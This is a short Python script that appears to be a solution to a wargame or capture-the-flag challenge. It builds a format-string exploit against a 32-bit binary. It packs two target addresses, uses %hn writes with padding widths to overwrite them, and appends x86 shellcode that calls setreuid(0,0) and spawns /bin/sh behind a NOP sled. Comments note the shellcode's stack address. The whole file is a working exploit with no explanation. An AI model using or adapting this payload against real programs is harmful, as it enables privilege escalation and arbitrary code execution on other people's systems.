#! /usr/bin/python

import struct

add = 0x804a014

add3 = 0x804a016


def pad(s):
	shellcode = ""
	shellcode +="\x90"*3
	shellcode +="\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
	com="ls"
	return s+shellcode+"\x90"*(125-len(s)-len(shellcode)-len(com))+com

ex = "X"
#ex +="AAAA"
ex +=struct.pack("I",add)
ex +="----"
ex +=struct.pack("I",add3)
ex +="----"
#ex +="%x-"*4+"%n"
ex +="%x-"*3
ex +="%52460x."
ex +="%hn"
ex +="%13036x"
ex +="%hn"




#print(ex)
print(pad(ex))

#0x0000005f
#0xddccbbaa
#0xffffcca3 shellcode